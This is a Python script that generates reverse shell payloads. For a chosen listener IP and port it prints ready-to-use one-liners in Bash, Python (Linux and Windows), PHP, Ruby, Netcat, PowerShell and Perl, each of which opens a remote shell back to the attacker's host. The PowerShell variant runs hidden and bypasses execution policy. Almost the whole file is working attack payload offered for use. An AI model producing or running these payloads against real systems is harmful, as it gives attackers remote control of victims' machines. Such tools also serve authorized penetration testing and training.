#!/usr/bin/env python3
"""
Reverse Shell Generator
=======================
Generates reverse shell payloads in various languages.
"""
import sys
import argparse

def generate_shells(ip, port, lang=None):
    shells = {
        "Bash": f"bash -i >& /dev/tcp/{ip}/{port} 0>&1",
        "Bash (UDP)": f"sh -i >& /dev/udp/{ip}/{port} 0>&1",
        "Python3": f"python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{ip}\",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'",
        "Python (Windows)": f"C:\\Python27\\python.exe -c \"(lambda __y, __g, __contextlib: [[[[[[[(s.connect(('{ip}', {port})), [[[(s2p_thread.start(), [[(p2s_thread.start(), (lambda __out: (lambda __ctx: [__ctx.__enter__(), __ctx.__exit__(None, None, None), __out[0](lambda: None)][2])(__contextlib.nested(type('except', (), {{'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: __exctype is not None and (issubclass(__exctype, KeyboardInterrupt) and [True][0])}})())))][0] for p2s_thread in [__threading.Thread(target=p2s, args=[s, p])]][0] for s2p_thread in [__threading.Thread(target=s2p, args=[s, p])]][0] for p in [__subprocess.Popen(['\\\\windows\\\\system32\\\\cmd.exe'], stdout=__subprocess.PIPE, stderr=__subprocess.STDOUT, stdin=__subprocess.PIPE)]][0])[1] for s in [__socket.socket(__socket.AF_INET, __socket.SOCK_STREAM)]][0] for p2s in [lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: (__l['s'].send(__l['p'].stdout.read(1)), __this())[1] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({{}})]][0] for s2p in [lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: [(lambda __out: (lambda __ctx: [__ctx.__enter__(), __ctx.__exit__(None, None, None), __out[0](lambda: None)][2])(__contextlib.nested(type('except', (), {{'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: __exctype is not None and (issubclass(__exctype, Exception) and [__l['p'].stdin.close(), True][1])}})())))([])][0] for __l['data'] in [__l['s'].recv(1024)]][0] if True else __after())())(lambda: None) for __l['s'], __l['p'], __l['data'] in [(s, p, '')]][0])({{}})]][0] for __socket in [__import__('socket', __g, __g)]][0] for __subprocess in [__import__('subprocess', __g, __g)]][0] for __threading in [__import__('threading', __g, __g)]][0])((lambda f: (lambda x: x(x))(lambda y: f(lambda: y(y)()))), globals(), __import__('contextlib'))\"",
        "PHP": f"php -r '$sock=fsockopen(\"{ip}\",{port});exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
        "Ruby": f"ruby -rsocket -e'f=TCPSocket.open(\"{ip}\",{port}).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'",
        "Netcat (Traditional)": f"nc -e /bin/sh {ip} {port}",
        "Netcat (OpenBSD)": f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {ip} {port} >/tmp/f",
        "PowerShell": f"powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient(\"{ip}\",{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + \"PS \" + (pwd).Path + \"> \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()",
        "Perl": f"perl -e 'use Socket;$i=\"{ip}\";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}};'"
    }

    print(f"\n[*] Generating reverse shells for {ip}:{port}")
    print("-" * 50)
    
    if lang and lang.lower() in [k.lower() for k in shells.keys()]:
        for k, v in shells.items():
            if k.lower() == lang.lower():
                print(f"\n[+] {k}:\n{v}")
    else:
        for name, payload in shells.items():
            print(f"\n[+] {name}:\n{payload}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Reverse Shell Generator")
    parser.add_argument("ip", help="LHOST - Listener IP")
    parser.add_argument("port", help="LPORT - Listener Port")
    parser.add_argument("lang", nargs="?", help="(Optional) Specific language to generate")
    
    args = parser.parse_args()
    generate_shells(args.ip, args.port, args.lang)
